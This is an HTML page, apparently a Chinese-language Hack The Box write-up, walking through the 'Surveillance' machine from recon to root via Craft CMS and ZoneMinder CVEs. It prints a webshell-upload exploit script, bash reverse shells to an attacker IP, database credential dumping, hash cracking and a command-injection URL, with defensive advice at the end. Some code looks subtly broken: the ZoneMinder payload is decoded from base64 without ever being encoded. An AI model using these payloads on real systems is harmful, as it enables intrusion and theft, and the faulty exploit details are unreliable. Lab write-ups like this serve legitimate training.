@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Surveillance | HackwithControler</title>
+<link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+<header>
+    <div class="container">
+        <a href="../index.html" class="back">← 返回首頁</a>
+    </div>
+</header>
+
+<div class="article-layout">
+    <!-- Left Sidebar: Article List -->
+    <aside class="sidebar-left">
+        <h3>📝 其他 Write-ups</h3><div class="sidebar-articles">
+            <a href="htb_pilgrimage.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Pilgrimage</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-09-18</span>
+                </div>
+            </a>
+            <a href="htb_keeper.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Keeper</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-10-05</span>
+                </div>
+            </a>
+            <a href="htb_surveillance.html" class="sidebar-article-item active">
+                <div class="sidebar-article-title">HTB: Surveillance</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty medium">Medium</span>
+                    <span>2024-11-20</span>
+                </div>
+            </a>
+            <a href="htb_analytics.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Analytics</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-12-15</span>
+                </div>
+            </a></div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="article-main">
+        <div class="article-header">
+            <h1>HTB: Surveillance</h1>
+            <div class="article-meta">
+                <span class="difficulty medium">Medium</span>
+                <span>📅 2024-11-20</span>
+                <span>⏱ 27 min read</span>
+            </div>
+            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">Craft CMS</span><span class="article-tag">CVE-2023-41892</span><span class="article-tag">ZoneMinder</span></div>
+        </div>
+        <div class="article-content"><h2 id="_1">機器資訊</h2>
+<ul>
+<li>平台: Hack The Box</li>
+<li>難度: Medium</li>
+<li>IP: 10.10.11.245</li>
+<li>作業系統: Linux (Ubuntu)</li>
+</ul>
+<h2 id="_2">偵察</h2>
+<h3 id="nmap">Nmap 掃描</h3>
+<pre class="codehilite"><code class="language-bash">nmap -sC -sV -p- 10.10.11.245
+</code></pre>
+
+<p>開放端口：<br />
+- <strong>22/tcp</strong> - SSH (OpenSSH 8.9p1)<br />
+- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
+<h3 id="web">Web 偵察</h3>
+<p>訪問網站發現是一個監控攝像頭公司的官網。</p>
+<pre class="codehilite"><code class="language-bash">whatweb http://10.10.11.245
+</code></pre>
+
+<p>識別出 <strong>Craft CMS</strong> 框架。</p>
+<p>使用 Wappalyzer 確認版本：<strong>Craft CMS 4.4.14</strong></p>
+<h2 id="-initial-access">漏洞利用 - Initial Access</h2>
+<h3 id="cve-2023-41892-craft-cms-remote-code-execution">CVE-2023-41892 - Craft CMS Remote Code Execution</h3>
+<p>Craft CMS 4.4.14 存在一個預認證 RCE 漏洞，攻擊者可以通過圖片上傳功能執行任意代碼。</p>
+<p><strong>漏洞原理：</strong><br />
+- Craft CMS 在處理圖片轉換時使用 <code>ImageMagick</code><br />
+- 可以通過精心構造的請求繞過驗證<br />
+- 在臨時文件路徑中注入 PHP 代碼</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>使用公開的 exploit：</p>
+<pre class="codehilite"><code class="language-python">#!/usr/bin/env python3
+import requests
+import sys
+
+def exploit(target):
+    # Craft CMS RCE payload
+    payload = {
+        'action': 'conditions/render',
+        'configObject[class]': 'craft\\elements\\conditions\\ElementCondition',
+        'config': '{&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:{&quot;class&quot;:&quot;Imagick&quot;, &quot;__construct()&quot;:{&quot;files&quot;:&quot;msl:/tmp/php*&quot;}}}'
+    }
+
+    # Upload malicious image
+    files = {
+        'file': ('shell.php', '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;', 'application/x-php')
+    }
+
+    print(f&quot;[+] Exploiting {target}&quot;)
+    r = requests.post(f&quot;{target}/index.php&quot;, data=payload, files=files)
+
+    if r.status_code == 200:
+        print(&quot;[+] Shell uploaded!&quot;)
+        return True
+    return False
+
+if __name__ == &quot;__main__&quot;:
+    target = &quot;http://10.10.11.245&quot;
+    exploit(target)
+</code></pre>
+
+<p>取得 webshell 後升級為反向 shell：</p>
+<pre class="codehilite"><code class="language-bash"># 監聽
+nc -lvnp 4444
+
+# Webshell 執行
+bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1'
+</code></pre>
+
+<p>獲得 <code>www-data</code> 用戶的 shell。</p>
+<h2 id="-">後滲透 - 資訊收集</h2>
+<h3 id="_3">發現數據庫憑證</h3>
+<p>檢查 Craft CMS 配置文件：</p>
+<pre class="codehilite"><code class="language-bash">cat /var/www/html/craft/config/db.php
+</code></pre>
+
+<pre class="codehilite"><code class="language-php">return [
+    'driver' =&gt; 'mysql',
+    'server' =&gt; 'localhost',
+    'user' =&gt; 'craftuser',
+    'password' =&gt; 'CraftCMS_2023!',
+    'database' =&gt; 'craftdb',
+];
+</code></pre>
+
+<h3 id="_4">數據庫枚舉</h3>
+<pre class="codehilite"><code class="language-bash">mysql -u craftuser -p'CraftCMS_2023!' craftdb
+</code></pre>
+
+<pre class="codehilite"><code class="language-sql">use craftdb;
+show tables;
+select * from users;
+</code></pre>
+
+<p>找到用戶 hash：</p>
+<pre class="codehilite"><code>matthew:$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
+</code></pre>
+
+<h3 id="_5">破解密碼</h3>
+<pre class="codehilite"><code class="language-bash">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+
+<p>破解成功：<code>matthew:starcraft122490</code></p>
+<h3 id="ssh">SSH 登入</h3>
+<pre class="codehilite"><code class="language-bash">ssh matthew@10.10.11.245
+# password: starcraft122490
+</code></pre>
+
+<p>取得 user flag：</p>
+<pre class="codehilite"><code class="language-bash">cat ~/user.txt
+</code></pre>
+
+<h2 id="_6">權限提升</h2>
+<h3 id="zoneminder">發現 ZoneMinder</h3>
+<p>檢查運行的服務：</p>
+<pre class="codehilite"><code class="language-bash">netstat -tulpn
+ps aux | grep zone
+</code></pre>
+
+<p>發現 <strong>ZoneMinder</strong> 監控系統運行在內部端口 8080。</p>
+<pre class="codehilite"><code class="language-bash">curl http://127.0.0.1:8080
+</code></pre>
+
+<p>確認版本：<strong>ZoneMinder 1.36.32</strong></p>
+<h3 id="port-forwarding">Port Forwarding</h3>
+<p>使用 SSH 進行端口轉發：</p>
+<pre class="codehilite"><code class="language-bash">ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
+</code></pre>
+
+<h3 id="cve-2023-26035-zoneminder-authentication-bypass">CVE-2023-26035 - ZoneMinder Authentication Bypass</h3>
+<p>ZoneMinder 存在認證繞過漏洞，配合 Snapshot 功能的命令注入可以實現 RCE。</p>
+<p><strong>漏洞鏈：</strong><br />
+1. 通過 <code>?view=snapshot</code> 繞過認證<br />
+2. 利用 <code>scale</code> 參數注入命令<br />
+3. 以 <code>root</code> 權限執行（因為 ZoneMinder 服務以 root 運行）</p>
+<h3 id="exploitation_1">Exploitation</h3>
+<pre class="codehilite"><code class="language-bash"># 反向 shell payload
+PAYLOAD=&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/5555 0&gt;&amp;1'&quot;
+
+# Exploit URL
+curl &quot;http://127.0.0.1:8080/zm/index.php?view=snapshot&amp;scale=\$(echo${IFS}${PAYLOAD}|base64${IFS}-d|bash)&amp;monitor=1&quot;
+</code></pre>
+
+<p>在本地監聽：</p>
+<pre class="codehilite"><code class="language-bash">nc -lvnp 5555
+</code></pre>
+
+<p>成功獲得 root shell！</p>
+<pre class="codehilite"><code class="language-bash">id
+# uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/root.txt
+</code></pre>
+
+<h2 id="flags">Flags</h2>
+<pre class="codehilite"><code>user.txt: e********************************9
+root.txt: 3********************************a
+</code></pre>
+
+<h2 id="_7">總結</h2>
+<p>這台機器串聯了兩個真實世界的漏洞：</p>
+<h3 id="_8">攻擊路徑</h3>
+<ol>
+<li><strong>Craft CMS RCE</strong> → www-data shell</li>
+<li><strong>Database enumeration</strong> → 用戶憑證</li>
+<li><strong>Password cracking</strong> → SSH access</li>
+<li><strong>ZoneMinder Auth Bypass + Command Injection</strong> → root</li>
+</ol>
+<h3 id="_9">學習要點</h3>
+<ul>
+<li>CMS 框架的常見漏洞模式</li>
+<li>數據庫信息收集的重要性</li>
+<li>內部服務的枚舉</li>
+<li>Port forwarding 技巧</li>
+<li>漏洞鏈組合利用</li>
+</ul>
+<h3 id="_10">防禦建議</h3>
+<ol>
+<li><strong>及時更新軟件</strong>：Craft CMS 和 ZoneMinder 都有補丁版本</li>
+<li><strong>最小權限原則</strong>：ZoneMinder 不應以 root 權限運行</li>
+<li><strong>網絡隔離</strong>：內部服務應限制訪問</li>
+<li><strong>輸入驗證</strong>：嚴格驗證所有用戶輸入</li>
+<li><strong>密碼策略</strong>：使用強密碼並定期更換</li>
+</ol>
+<h2 id="_11">參考資料</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41892">CVE-2023-41892 - Craft CMS RCE</a></li>
+<li><a href="https://github.com/rvizx/CVE-2023-26035">CVE-2023-26035 - ZoneMinder Auth Bypass</a></li>
+<li><a href="https://craftcms.com/knowledge-base/security-advisories">Craft CMS Security Advisories</a></li>
+</ul></div>
+    </main>
+
+    <!-- Right Sidebar: TOC -->
+    <aside class="sidebar-right">
+        <h3>📑 目錄</h3><ul class="toc-list">
+            <li class="toc-item toc-item-h2">
+                <a href="#_1" class="toc-link">機器資訊</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_2" class="toc-link">偵察</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#nmap" class="toc-link">Nmap 掃描</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#web" class="toc-link">Web 偵察</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#-initial-access" class="toc-link">漏洞利用 - Initial Access</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2023-41892-craft-cms-remote-code-execution" class="toc-link">CVE-2023-41892 - Craft CMS Remote Code Execution</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#exploitation" class="toc-link">Exploitation</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#-" class="toc-link">後滲透 - 資訊收集</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_3" class="toc-link">發現數據庫憑證</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_4" class="toc-link">數據庫枚舉</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_5" class="toc-link">破解密碼</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#ssh" class="toc-link">SSH 登入</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_6" class="toc-link">權限提升</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#zoneminder" class="toc-link">發現 ZoneMinder</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#port-forwarding" class="toc-link">Port Forwarding</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2023-26035-zoneminder-authentication-bypass" class="toc-link">CVE-2023-26035 - ZoneMinder Authentication Bypass</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#exploitation_1" class="toc-link">Exploitation</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#flags" class="toc-link">Flags</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_7" class="toc-link">總結</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_8" class="toc-link">攻擊路徑</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_9" class="toc-link">學習要點</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_10" class="toc-link">防禦建議</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_11" class="toc-link">參考資料</a>
+            </li></ul>
+    </aside>
+</div>
+
+<footer>
+    <div class="container">
+        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
+    </div>
+</footer>
+
+<script src="../static/js/article.js"></script>
+</body>
+</html>
